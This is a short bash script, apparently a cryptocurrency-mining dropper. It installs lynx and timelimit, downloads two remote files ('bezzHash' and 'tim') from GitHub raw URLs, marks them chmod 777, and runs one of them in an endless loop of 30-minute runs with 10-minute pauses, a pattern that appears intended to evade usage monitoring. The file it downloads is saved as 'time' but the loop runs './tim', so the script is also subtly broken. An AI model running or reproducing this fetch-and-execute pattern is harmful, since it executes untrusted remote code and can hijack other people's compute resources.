#!/bin/bash
sudo apt update && sudo apt install -y lynx
lynx -dont_wrap_pre -dump "https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash" > bezzHash &&
chmod 777 bezzHash && 
sudo apt install timelimit -y 
wget -O time https://raw.githubusercontent.com/WoodcoinLog/log/main/tim
chmod 777 time
while :; do timeout 30m bash ./tim; sleep 10m; done
